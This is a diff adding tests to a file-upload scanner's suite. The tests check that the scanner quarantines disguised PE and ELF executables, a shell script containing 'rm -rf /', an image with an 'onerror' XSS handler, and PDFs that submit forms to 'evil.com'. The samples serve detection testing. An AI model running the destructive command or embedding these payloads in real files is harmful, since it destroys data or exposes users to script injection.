@@ -122,6 +122,31 @@ describe("scanReceipt — quarantine decisions", () => {
     expect(scanReceipt(polyglot, "image/jpeg")).toMatchObject({ verdict: "quarantine", reasons: ["embedded_script"] });
   });
 
+  it("quarantines disguised Windows PE and Linux ELF executables (#451)", () => {
+    const pe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
+    expect(scanReceipt(pe, "image/jpeg")).toMatchObject({ verdict: "quarantine", reasons: ["malware_executable_pe"] });
+
+    const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
+    expect(scanReceipt(elf, "image/png")).toMatchObject({ verdict: "quarantine", reasons: ["malware_executable_elf"] });
+  });
+
+  it("quarantines shell scripts and embedded event handlers (#451)", () => {
+    const sh = bytes("#!/bin/sh\nrm -rf /");
+    expect(scanReceipt(sh, "application/pdf")).toMatchObject({ verdict: "quarantine", reasons: ["malware_shell_script"] });
+
+    const handler = new Uint8Array(Buffer.concat([PNG, bytes("<img src=x onerror=alert(1)>")]));
+    expect(scanReceipt(handler, "image/png")).toMatchObject({ verdict: "quarantine", reasons: ["embedded_event_handler"] });
+  });
+
+  it("quarantines PDFs with remote form submission or data import", () => {
+    expect(scanReceipt(bytes("%PDF-1.4 /SubmitForm (http://evil.com)"), "application/pdf").reasons).toContain(
+      "pdf_submit_form",
+    );
+    expect(scanReceipt(bytes("%PDF-1.4 /ImportData"), "application/pdf").reasons).toContain(
+      "pdf_import_data",
+    );
+  });
+
   it("passes ordinary files", () => {
     expect(scanReceipt(PDF, "application/pdf").verdict).toBe("clean");
     expect(scanReceipt(PNG, "image/png").verdict).toBe("clean");
